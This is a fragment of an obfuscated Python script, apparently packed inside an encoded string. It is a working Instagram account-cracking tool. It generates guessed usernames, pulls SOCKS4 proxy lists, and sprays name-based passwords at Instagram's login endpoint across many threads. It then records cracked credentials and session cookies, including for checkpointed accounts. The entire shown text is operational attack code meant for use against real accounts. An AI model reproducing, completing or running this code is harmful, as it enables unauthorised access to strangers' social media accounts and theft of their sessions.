\']:\n            exit(f"{P}[{M}!{P}]{M} Cant be Empty")\n        ___domain = input(f"{H}[{P}?{H}]{P} Domain :{K} ")\n        if ___domain in [\'@gmail.com\',\'@yahoo.com\',\'@hotmail.com\',\'@email.com\',\'@mail.com\',\'@outlook.com\',\'@yandex.com\']:\n            ___limit = int(input(f"{H}[{P}?{H}]{P} Limit :{K} "))\n            if ___limit >=1001:\n                exit(f"{P}[{M}!{P}]{M} Maximum 1000")\n            else:\n                print(f"{P} ")\n                ___file = \'Dump/\'+___nama+\'.txt\'\n                for _ in range(___limit):\n                    ___nomor = random.randint(1, 999)\n                    ___user = ___nama + str(___nomor) + ___domain + \'<=>\' + ___nama + \' \' + str(___nomor)\n                    open(___file, \'a\').write(f\'{___user}\\n\')\n                    print(f"{___user}")\n                print(f"\\n{B}[{P}*{B}]{P} Done...")\n                print(f"{B}[{P}?{B}]{P} Files Saved In :{K} {___file}")\n                input(f"{M}[{P}Return{M}]{P}");___menu___()\n        else:\n            exit(f"{P}[{M}!{P}]{M} Domain \'@gmail.com\',\'@yahoo.com\',\'@hotmail.com\',\'@email.com\',\'@mail.com\',\'@outlook.com\',\'@yandex.com\'")\n    except Exception as e:\n        exit(f"{P}[{M}!{P}]{M} {e}")\n# Proxy\ndef ___proxy___():\n    try:\n        ___roz = requests.get(\'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all\').text\n        open(\'Data/proxy.txt\', \'w\').write(___roz)\n    except Exception as e:\n        ___roz = requests.get(\'https://raw.githubusercontent.com/ofoncity01/prem/main/Data/Proxy2.txt\').text\n        open(\'Data/Proxy.txt\', \'w\').write(___roz)\n    ___crack___()\n# Crack\nclass ___crack___:\n    \n    def __init__(self):\n        self.kill = 0\n        self.ok = []\n        self.cp = []\n        print(f"\\n{H}[{P}1{H}]{P} Use Password {H}[{K}name, name123, name12345{H}]{K}")\n        print(f"{H}[{P}2{H}]{P} Use Password {H}[{K}name, name123, name1234, name12345{H}]{K}")\n        print(f"{H}[{P}3{H}]{P} Use Password {H}[{K}name, name123, name1234, name12345, name123456{H}]{K}")\n        print(f"{H}[{P}4{H}]{P} Use Manual Password {H}[{K}>5{H}]{K}\\n")\n        ___pilih = input(f"{B}[{P}?{B}]{P} Select :{H} ")\n        if ___pilih in [\'4\',\'04\']:\n            pwx = input(f"{B}[{P}?{B}]{P} Password :{H} ").split(\',\')\n        try:\n            self.___dump = input(f"{B}[{P}?{B}]{P} File Dump :{H} ")\n            self.___file = open(self.___dump, \'r\').read().splitlines()\n        except (IOError):\n            exit(f"{P}[{M}!{P}]{M} File Tidak Ada")\n        try:\n            print(f"\\n{H}[{P}\xe2\x80\xa2{H}]{P} Ok Results Saved In Results/Ok.txt")\n            print(f"{H}[{P}\xe2\x80\xa2{H}]{P} Cp Results Saved In Results/Cp.txt\\n")\n            with ThreadPoolExecutor(max_workers=30) as (___hayuk):\n                for ___user in self.___file:\n                    username, nama = ___user.split(\'<=>\')\n                    z = nama.split(\' \')\n                    if ___pilih in [\'1\',\'01\']:\n                        password = [nama.replace(\' \',\'\'), nama, z[0]+\'123\', z[0]+\'12345\']\n                    elif ___pilih in [\'2\',\'02\']:\n                        password = [nama.replace(\' \',\'\'), nama, z[0]+\'123\', z[0]+\'1234\', z[0]+\'12345\']\n                    elif ___pilih in [\'3\',\'03\']:\n                        password = [nama.replace(\' \',\'\'), nama, z[0]+\'123\', z[0]+\'1234\', z[0]+\'12345\', z[0]+\'123456\']\n                    elif ___pilih in [\'4\',\'04\']:\n                        password = pwx\n                    else:\n                        password = [nama.replace(\' \',\'\'), nama, z[0]+\'123\', z[0]+\'1234\', z[0]+\'12345\']\n                    ___hayuk.submit(self.__main__, self.___file, username, password)\n            exit(f"\\n{M}[{P}Done{M}]{P}")\n        except (ValueError):\n            exit(f"{P}[{M}!{P}]{M} Crack is complete, there seems to be an error, please re-dump!")\n    def __main__(self, user, uid, pwx):\n        try:\n            ___useragent = open(\'Data/ua.txt\', \'r\').read()\n        except (IOError):\n            ___useragent = (\'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36\')\n        try:\n            for pw in pwx:\n                pw = pw.lower()\n                ___url = (\'https://www.instagram.com/\')\n                ___login = (\'https://www.instagram.com/accounts/login/ajax/\')\n                ___proxy = {\'http\': \'socks4://%s\'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}\n                ___csrf = requests.get(___url).cookies[\'csrftoken\']\n                ___data = {\'username\': uid,\n                \'enc_password\': f\'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}\',\n                \'queryParams\': {},\n                \'optIntoOneTap\': \'false\'}\n                ___head = {\'User-Agent\': random.choice(open("Data/ua.txt","r").read().splitlines()),\n                \'X-Requested-With\': \'XMLHttpRequest\',\n                \'Referer\': \'https://www.instagram.com/accounts/login/\',\n                \'x-csrftoken\': ___csrf}\n                with requests.Session() as ses:\n                    response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()\n                    if \'userId\' in str(response):\n                        coki = (f\'mid={ses.cookies.get_dict()["mid"]};ig_did={ses.cookies.get_dict()["ig_did"]};ig_nrcb=1;shbid="9776\\0541986587953\\0541674289809:01f713acdf5c4921a542aff43695805d8e788f5580f4efaaf714ca7301ba34bb727790c9";shbts="1642753809\\0541986587953\\0541674289809:01f7227f6219fb0a036e3593c1531e9b9c9eb1db9dcbb7b4590ba36ffcbe62715eb10ada";csrftoken={ses.cookies.get_dict()["csrftoken"]};ds_user_id={ses.cookies.get_dict()["ds_user_id"]};sessionid={ses.cookies.get_dict()["sessionid"]};rur="EAG\\0541986587953\\0541674477820:01f724c03ff38f24662b1648dd2a933fc4a6e66b7a2bef2458d140bfb76ee86296f6cd8b"\')\n                        try:\n                            ___roz = requests.get(f\'https://www.instagram.com/{uid}/?__a=1\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()[\'graphql\'][\'user\']\n                            follower = ___roz[\'edge_followed_by\'][\'count\']\n                            following = ___roz[\'edge_follow\'][\'count\']\n                        except (KeyError, IOError):\n                            follower = (\'-\')\n                            following = (\'-\')\n                        except:pass\n                        print(f"\\r{B}[{P}\xe2\x9c\x94{B}]{P} Status :{H} Success     ")\n                        print(f"{B}[{P}>{B}]{P} Username :{H} {uid}")\n                        print(f"{B}[{P}>{B}]{P} Password :{H} {pw}")\n                        print(f"{B}[{P}>{B}]{P} Follower :{H} {follower}")\n                        print(f"{B}[{P}>{B}]{P} Following :{H} {following}")\n                        print(f"{B}[{P}>{B}]{P} Cookie :{H} {coki}\\n")\n                        self.ok.append(f"{uid}|{pw}")\n                        open(\'Results/Ok.txt\',\'a\').write(f"{uid}|{pw}\\n")\n                        break\n                    elif \'checkpoint_required\' in str(response):\n                        try:\n                            ___roz = requests.get(f\'https://www.instagram.com/{uid}/?__a=1\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()[\'graphql\'][\'user\']\n                            follower = ___roz[\'edge_followed_by\'][\'count\']\n                            following = ___roz[\'edge_follow\'][\'count\']\n                        except (KeyError, IOError):\n                            follower = (\'-\')\n                            following = (\'-\')\n                        except:pass\n                        print(f"\\r{B}[{P}\xe2\x9c\x98{B}]{P} Status :{K} Checkpoint    ")\n                        print(f"{B}[{P}>{B}]{P} Username :{K} {uid}")\n                        print(f"{B}[{P}>{B}]{P} Password :{K} {pw}")\n                        print(f"{B}[{P}>{B}]{P} Follower :{K} {follower}")\n                        print(f"{B}[{P}>{B}]{P} Following :{K} {following}\\n")\n                        self.cp.append(f"{uid}|{pw}")\n                        open(\'Results/Cp.txt\',\'a\').write(f"{uid}|{pw}\\n")\n                        break\n                    elif \'Please wait\' in str(response):\n                        print(f"{P}[{M}!{P}]{M} Gunakan Mode Pesawat 2 Detik", end=\'\\r\');sleep(7);__main__(self, user, uid, pwx)\n                    else:\n                        continue\n            self.kill +=1\n            print(f"{P}[{P}Crack{P}]{P} {self.kill}/{str(len(user))} Cp:-{len(self.cp)} Ok:-{len(self.ok)}          ", end=\'\\r\')\n        except (ConnectionError):\n            print(f"{P}[{K}!{P}]{K} Connection Error               ", end=\'\\r\');sleep(7);__main__(self, user, uid, pwx)\n        except:__main__(self, user, uid, pwx)\n\nif __name__==\'__main__\':\n    os.system(\'git pull\')\n    ___menu___()\n')(__import__('codecs').decode)